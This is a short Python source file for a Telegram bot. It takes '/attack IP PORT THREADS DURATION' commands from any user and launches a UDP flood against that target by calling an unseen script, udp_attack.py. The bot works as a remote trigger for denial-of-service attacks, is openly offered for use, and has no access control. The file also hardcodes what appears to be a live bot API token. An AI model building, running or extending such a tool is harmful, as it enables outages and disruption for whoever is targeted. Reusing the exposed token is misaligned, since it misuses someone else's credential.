import telebot
import subprocess

API_TOKEN = '8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Use /attack [IP] [PORT] [THREADS] [DURATION] to start a UDP attack.")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /attack [IP] [PORT] [THREADS] [DURATION]")
        return

    target_ip = args[1]
    target_port = int(args[2])
    threads = int(args[3]) if len(args) > 3 else 10
    duration = int(args[4]) if len(args) > 4 else 60

    subprocess.run(["python3", "udp_attack.py", target_ip, str(target_port), "--threads", str(threads), "--duration", str(duration)])

    bot.reply_to(message, f"Started UDP attack on {target_ip}:{target_port} with {threads} threads for {duration} seconds.")

bot.polling()
